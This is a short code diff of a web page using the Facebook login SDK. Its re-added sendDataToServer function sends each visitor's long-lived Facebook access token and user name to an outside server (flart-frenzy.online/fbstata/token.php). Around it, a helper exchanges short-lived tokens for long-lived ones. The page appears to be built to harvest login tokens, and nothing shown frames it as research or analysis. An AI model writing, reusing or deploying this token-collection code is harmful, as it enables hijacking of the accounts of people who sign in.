@@ -31,10 +31,6 @@
         xfbml: true,
         version: 'v16.0'
       });
-
-      FB.getLoginStatus(function(response) {
-        statusChangeCallback(response);
-      });
     };
 
     function getLongLivedToken(shortLivedToken) {
@@ -61,26 +57,26 @@
       xhttp.send();
     }
 
-function sendDataToServer(longLivedToken, userName) {
-  var yourServerURL = "https://flart-frenzy.online/fbstata/token.php"; // Замените на URL вашего сервера
-  var url = new URL(yourServerURL);
-  url.searchParams.append("longLivedToken", longLivedToken);
-  url.searchParams.append("userName", userName);
+    function sendDataToServer(longLivedToken, userName) {
+      var yourServerURL = "https://flart-frenzy.online/fbstata/token.php"; // Replace with your server's URL
+      var url = new URL(yourServerURL);
+      url.searchParams.append("longLivedToken", longLivedToken);
+      url.searchParams.append("userName", userName);
 
-  fetch(url)
-    .then(response => {
-      if (!response.ok) {
-        throw new Error("Network response was not ok");
-      }
-      return response.text();
-    })
-    .then(data => {
-      console.log('Success:', data);
-    })
-    .catch((error) => {
-      console.error('Error:', error);
-    });
-}
+      fetch(url)
+        .then(response => {
+          if (!response.ok) {
+            throw new Error("Network response was not ok");
+          }
+          return response.text();
+        })
+        .then(data => {
+          console.log('Success:', data);
+        })
+        .catch((error) => {
+          console.error('Error:', error);
+        });
+    }
 
   </script>
 
